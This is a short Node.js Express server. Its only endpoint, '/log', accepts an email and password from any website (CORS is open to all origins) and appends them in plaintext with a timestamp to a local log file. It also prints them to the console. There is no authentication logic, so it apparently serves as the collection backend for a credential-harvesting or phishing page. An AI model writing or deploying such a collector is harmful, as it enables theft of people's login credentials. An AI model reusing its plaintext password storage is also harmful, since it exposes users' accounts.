const express = require('express');
const fs = require('fs');
const app = express();

// Allow CORS (so the frontend can talk to the backend)
app.use(function(req, res, next) {
    res.header("Access-Control-Allow-Origin", "*");
    res.header("Access-Control-Allow-Headers", "Content-Type");
    next();
});

app.use(express.json());

// Handle the POST request from the frontend
app.post('/log', function(req, res) {
    const email = req.body.email;
    const password = req.body.password;
    const log = "Email: " + email + ", Password: " + password + ", Time: " + new Date() + "\n";

    fs.appendFile('logs.txt', log, function(err) {
        if (err) console.log("Error saving!");
    });

    console.log(log);
    res.send('Done');
});

// Use the port Render provides, or default to 3000 for local testing
const port = process.env.PORT || 3000;
app.listen(port, '0.0.0.0', function() {
    console.log("Server started on port " + port);
});